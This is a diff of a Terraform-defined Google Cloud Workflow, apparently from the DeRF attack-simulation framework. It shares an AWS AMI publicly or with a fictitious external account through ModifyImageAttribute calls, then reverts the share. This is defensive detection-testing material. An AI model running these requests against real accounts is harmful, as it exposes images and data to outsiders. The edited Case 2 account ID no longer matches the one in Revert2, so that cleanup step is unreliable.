@@ -16,15 +16,17 @@ resource "google_workflows_workflow" "workflow_to_invoke_aws_ec2_ami_share_snaps
 ## Attack Description
 ######################################################################################
 
-## This attack has two 'cases'
-## The first case you have the option to share an AMI Snapshot with an external, fictitious AWS account, (012345678912)
-## The second case will share the same AMI snapshot with {"groups":"all"} - everyone.
-## Finally, the module reverts the share back with the default user.
+## This attack has two 'cases' - two different ways to share an EBS Snapshot externally. 
+## The first option shares an AMI snapshot with {"groups":"all"} - everyone.
+## The second case shares an AMI Snapshot with an external, fictitious AWS account, (012345678912)
+
+## Cleanup
+# The workflow finally reverts the modification of the snapshot attributes, with the default user.
 
 #####################################################################################
 ## Input
 ######################################################################################
-# Sharing the AMI with an external fictious account
+# Sharing the AMI with an external fictitious account
 ##### INPUT: {"case":"1","user":"user01"}
 ##### INPUT: {"case":"1","user":"user02"}
 
@@ -36,7 +38,7 @@ resource "google_workflows_workflow" "workflow_to_invoke_aws_ec2_ami_share_snaps
 ######################################################################################
 ## User Agent
 ######################################################################################
-#### Workflow executes with the User-Agent string: "Derf-AWS-Share-RDS-Snapshot-WORKFLOWEXECUTIONID"
+#### Workflow executes with the User-Agent string: "Derf-AWS-EC2-AMI-Share-Snapshot-WORKFLOWEXECUTIONID"
 
 
 
@@ -116,21 +118,21 @@ Case1:
     - ModifyImageAttribute:
         try:
             steps:
-                - callModifySnapshotAttribute:
+                - callModifyImageAttribute:
                     call: http.post
                     args:
                       url: '$${appEndpoint+"/submitRequest"}'
                       auth:
                           type: OIDC
                       headers:
-                          User-Agent: "DeRF-Workflow"
+                          User-Agent: "DeRF-Workflow-Attack-Technique"
                       body:
                           HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                           REGION: ${data.aws_region.current.name}
                           SERVICE: "ec2" 
                           ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                           BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Add.1.Group=all"
-                          UA: '$${"Derf-AWS-Share-RDS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
+                          UA: '$${"Derf-AWS-EC2-AMI-Share-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                           CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                           USER: $${user}
                           VERB: POST
@@ -196,21 +198,21 @@ Case2:
     - ModifyImageAttribute:
         try:
             steps:
-                - callModifySnapshotAttribute:
+                - callModifyImageAttribute:
                     call: http.post
                     args:
                       url: '$${appEndpoint+"/submitRequest"}'
                       auth:
                           type: OIDC
                       headers:
-                          User-Agent: "DeRF-Workflow"
+                          User-Agent: "DeRF-Workflow-Attack-Technique"
                       body:
                           HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                           REGION: ${data.aws_region.current.name}
                           SERVICE: "ec2" 
                           ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
-                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Add.1.UserId=123456789012"
-                          UA: '$${"Derf-AWS-Share-RDS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
+                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Add.1.UserId=012345678912"
+                          UA: '$${"Derf-AWS-EC2-AMI-Share-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                           CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                           USER: $${user}
                           VERB: POST
@@ -284,14 +286,14 @@ Revert1:
                       auth:
                           type: OIDC
                       headers:
-                          User-Agent: "DeRF-Workflow"
+                          User-Agent: "DeRF-Workflow-Attack-Technique"
                       body:
                           HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                           REGION: ${data.aws_region.current.name}
                           SERVICE: "ec2" 
                           ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                           BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Remove.1.Group=all"
-                          UA: '$${"DeRF-Workflow=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
+                          UA: 'AWS-EC2-AMI-Share-Snapshot-Revert'
                           CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                           VERB: POST
                     result: response
@@ -364,14 +366,14 @@ Revert2:
                       auth:
                           type: OIDC
                       headers:
-                          User-Agent: "DeRF-Workflow"
+                          User-Agent: "DeRF-Workflow-Attack-Technique"
                       body:
                           HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                           REGION: ${data.aws_region.current.name}
                           SERVICE: "ec2" 
                           ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                           BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Remove.1.UserId=123456789012"
-                          UA: '$${"DeRF-Workflow=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
+                          UA: 'AWS-EC2-AMI-Share-Snapshot-Revert'
                           CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                           VERB: POST
                     result: response
